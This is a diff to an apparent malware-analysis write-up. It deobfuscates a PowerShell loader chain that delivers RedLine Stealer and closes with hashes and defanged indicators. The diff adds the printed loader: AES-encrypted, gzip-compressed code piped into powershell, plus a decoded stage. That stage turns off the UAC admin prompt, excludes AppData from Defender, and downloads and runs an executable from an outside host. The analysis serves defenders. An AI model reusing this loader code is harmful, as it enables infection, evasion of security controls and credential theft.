@@ -99,13 +99,41 @@ Add a subtract operator with a space delimiter, to take 443 away from the decima
 Finally, convert the decimals from decimal, merge, and remove whitespace to reveal the following:
 
 ```powershell
--w1-epUnrestricted-
-nop$xRnrtl='AAAAAAAAAAAAAAAAAAAAAD0Af5kmiW2Hnx1ert6ZiHkcrCG5xRw5g+RXkvjSvgaUbk+srbVrOsQgn8toO+hu0Qw1KQj7FAk5xMoqfeLJjMEeamlWrF3FTQ6in6FDMU0esWs41x91rJ/vkrJQOkHUMM2MmLD03n+lBrw2YeIcINOqvu4GIVPjd+Fis/QpUW5Fj8iNCDQy7bTeb/cl1K0KC1ocqAlvj83iKlmuvdzxPum6cIQxLt+2YLh6fmAQocUETi+pQw294/BrcWHiPbCLQ3IVN1QFO/QcDcgmCGGhLZSmlSKvXW
-S4pkFTnsaeCv0q8qpFQPIbBpzGkWGBKxMJYhQh81lXHyPxeOeFyFq6jqW2vUm+uqMCwX1N5g5UHXYw3Qg4zpyOCq0I5EwoDqzACg0FQ7NLbZAuwhTLK+Yu1JUpq7a86i+FRnVjkA9yOJMjUROJtiOoDNfMdo0ej8BzSKoid4bytekfnZGfb1xfEAyrNCki102wWcJK/vZZFJJQ0EWOmR4qPclxZ3kj3QXa7iwBBn/xEMGg8xE8RDWaHfXHZqdxlpnoKmQX6CchYBPK5Q/alHBAM5gOIN5RcmnQecgz+itBcGKRKac4QUIuYCsTNOGF
-Gvc0/93UPNG9W8OrCD+b24Y2bZP/KolyWolNdjJRHwp4RJAA9iJshbpdMe4n95z2TmNVPEVN28sDZ0kfiJCKpkbu1TkpQNSnY46SLTiZTT3ajO8Sox/hCnztghhj4DMhfQfHJBcMyZ1yynlBM+7lNgUyvioQxQ2KPY7KDi7JTpk1iQYGc+oBvO/fWUMtz9kzyEyxJpOGkwI3MMjDpUYIc9iprfEHj8hpwVdPjhcenIyhZqn28939MlitHffq24shDMzCPgjnU9OWPsMhEKvfu34pU/yjbMkwLHEjcQ==';$PWFaA='d0hDTktlemN0
-SlFHRXFla0Rjb094cnRoUGlSR050VmI=';$rtbrSxS=New-Object'System.Security.Cryptography.AesManaged';$rtbrSxS.Mode=[System.Security.Cryptography.CipherMode]::ECB;$rtbrSxS.Padding=[System.Security.Cryptography.PaddingMode]::Zeros;$rtbrSxS.BlockSize=128;$rtbrSxS.KeySize=256;$rtbrSxS.Key=
-[System.Convert]::FromBase64String($PWFaA);$jIXAy=[System.Convert]::FromBase64String($xRnrtl);$rSpXWojt=$jIXAy[0..15];$rtbrSxS.IV=$rSpXWojt;$mXooDLjjw=$rtbrSxS.CreateDecryptor();$KHnzkbgXQ=$mXooDLjjw.TransformFinalBlock($jIXAy,16,$jIXAy.Length-16);$rtbrSxS.Dispose();$iIauy=New-
-ObjectSystem.IO.MemoryStream(,$KHnzkbgXQ);$Izyrh=New-ObjectSystem.IO.MemoryStream;$thcRRYmqg=New-ObjectSystem.IO.Compression.GzipStream$iIauy,([IO.Compression.CompressionMode]::Decompress);$thcRRYmqg.CopyTo($Izyrh);$thcRRYmqg.Close();$iIauy.Close();[byte[]]$QWoIKfh=$Izyrh.ToArray();$KKSHrJAF=
-[System.Text.Encoding]::UTF8.GetString($QWoIKfh);$KKSHrJAF|powershell
+$xRnrtl = 'AAAAAAAAAAAAAAAAAAAAAD0Af5kmiW2Hnx1ert6ZiHkcrCG5xRw5g+RXkvjSvgaUbk+srbVrOsQgn8toO+hu0Qw1KQj7FAk5xMoqfeLJjMEeamlWrF3FTQ6in6FDMU0esWs41x91rJ/vkrJQOkHUMM2MmLD03n+lBrw2YeIcINOqvu4GIVPjd+Fis/QpUW5Fj8iNCDQy7bTeb/cl1K0KC1ocqAlvj83iKlmuvdzxPum6cIQxLt+2YLh6fmAQocUETi+pQw294/BrcWHiPbCLQ3IVN1QFO/QcDcgmCGGhLZSmlSKvXWS4pkFTnsaeCv0q8qpFQPIbBpzGkWGBKxMJYhQh81lXHyPxeOeFyFq6jqW2vUm+uqMCwX1N5g5UHXYw3Qg4zpyOCq0I5EwoDqzACg0FQ7NLbZAuwhTLK+Yu1JUpq7a86i+FRnVjkA9yOJMjUROJtiOoDNfMdo0ej8BzSKoid4bytekfnZGfb1xfEAyrNCki102wWcJK/vZZFJJQ0EWOmR4qPclxZ3kj3QXa7iwBBn/xEMGg8xE8RDWaHfXHZqdxlpnoKmQX6CchYBPK5Q/alHBAM5gOIN5RcmnQecgz+itBcGKRKac4QUIuYCsTNOGFGvc0/93UPNG9W8OrCD+b24Y2bZP/KolyWolNdjJRHwp4RJAA9iJshbpdMe4n95z2TmNVPEVN28sDZ0kfiJCKpkbu1TkpQNSnY46SLTiZTT3ajO8Sox/hCnztghhj4DMhfQfHJBcMyZ1yynlBM+7lNgUyvioQxQ2KPY7KDi7JTpk1iQYGc+oBvO/fWUMtz9kzyEyxJpOGkwI3MMjDpUYIc9iprfEHj8hpwVdPjhcenIyhZqn28939MlitHffq24shDMzCPgjnU9OWPsMhEKvfu34pU/yjbMkwLHEjcQ==';$PWFaA = 'd0hDTktlemN0SlFHRXFla0Rjb094cnRoUGlSR050VmI=';$rtbrSxS = New-Object 'System.Security.Cryptography.AesManaged';$rtbrSxS.Mode = [System.Security.Cryptography.CipherMode]::ECB;$rtbrSxS.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;$rtbrSxS.BlockSize = 128;$rtbrSxS.KeySize = 256;$rtbrSxS.Key = [System.Convert]::FromBase64String($PWFaA);$jIXAy = [System.Convert]::FromBase64String($xRnrtl);$rSpXWojt = $jIXAy[0..15];$rtbrSxS.IV = $rSpXWojt;$mXooDLjjw = $rtbrSxS.CreateDecryptor();$KHnzkbgXQ = $mXooDLjjw.TransformFinalBlock($jIXAy, 16, $jIXAy.Length - 16);$rtbrSxS.Dispose();$iIauy = New-Object System.IO.MemoryStream( , $KHnzkbgXQ );$Izyrh = New-Object System.IO.MemoryStream;$thcRRYmqg = New-Object System.IO.Compression.GzipStream $iIauy, ([IO.Compression.CompressionMode]::Decompress);$thcRRYmqg.CopyTo( $Izyrh );$thcRRYmqg.Close();$iIauy.Close();[byte[]] $QWoIKfh = $Izyrh.ToArray();$KKSHrJAF = [System.Text.Encoding]::UTF8.GetString($QWoIKfh);$KKSHrJAF | powershell 
 ```
+This shows a Base64 chunk being defined, operations are then performed involving AES decryption and gunzip decompression.
+
+The easiest and quickest way to deobfuscate this payload is to altar it, and change the 'powershell' command after the pipe, to a 'write-host' command. This will write the output to the screen rather than execute it.
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/39b6aa60-6d4f-4572-a1df-135237d6ef96)
+
+Output:
+```powershell
+function tkv($oiY, $lvh){[IO.File]::WriteAllBytes($oiY, $lvh)};function ITJ($oiY){start $oiY };function ECK($ubz){$nXv = New-Object (RBN @(4872,4895,4910,4840,4881,4895,4892,4861,4902,4899,4895,4904,4910));[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::TLS12;$lvh =
+$nXv.DownloadData($ubz);return $lvh};function RBN($rmT){$viX=4794;$waA=$Null;foreach($iRh in $rmT){$waA+=[char]($iRh-$viX)};return $waA};function kHm(){$QeC = $env:AppData + '\';;;Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name
+ConsentPromptBehaviorAdmin -Value 0;$cquZVsIq=$env:AppData; Add-MpPreference -ExclusionPath $cquZVsIq;$RMwEDinhcNfjtP = $QeC + 'driver.exe'; if (Test-Path -Path $RMwEDinhcNfjtP){ITJ $RMwEDinhcNfjtP;}Else{ $PmVCwHNs = ECK (RBN
+@(4898,4910,4910,4906,4909,4852,4841,4841,4910,4905,4906,4910,4895,4904,4894,4911,4902,4899,4893,4898,4903,4915,4840,4893,4905,4903,4841,4851,4914,4850,4898,4848,4909,4914,4850,4904,4847,4913,4841,4894,4908,4899,4912,4895,4908,4840,4895,4914,4895));tkv $RMwEDinhcNfjtP $PmVCwHNs;ITJ $RMwEDinhcNfjtP};;;}kHm;
+```
+
+Similar to the previous obfuscation method, the values are subtracted by 4794, so we'll use the same CyberChef recipe as before with the new value to deobfuscate the array.
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/561e303e-6e57-463c-b115-d4c321f0b9ef)
+
+The script downloads and executes the file hosted at: 'hxxps[://]toptendulichmy[.]com/9x8h6sx8n5w/driver.exe', which is our final [payload](https://www.virustotal.com/gui/file/c2a05b1464bf42096ffe1740fa927abfbb513ded47ead9b2133c28ce834363c3/detection), RedLine Stealer.
+
+**IOCs:**
+
+SHA 256: 707e623b27d794685b3b0a24d1dafe035274f62535fa67934eb1a4d39d3d9b50
+
+SHA 256: 302ec5af12ccc15b5771b3ed2b951ddc708f757c2103a1d6e71790f03902025e
+
+SHA 256: c2a05b1464bf42096ffe1740fa927abfbb513ded47ead9b2133c28ce834363c3
+
+URL: hxxps[://]dl.dropboxusercontent[.]com/scl/fi/aur0asu195akuhc7q88lq/mlwr?rlkey=ltpi9kve7882q0vksvvb54han
+
+URL: hxxps[://]toptendulichmy[.]com/9x8h6sx8n5w/driver.exe
+
+IP: 45.15.156[.]127
+
+
 
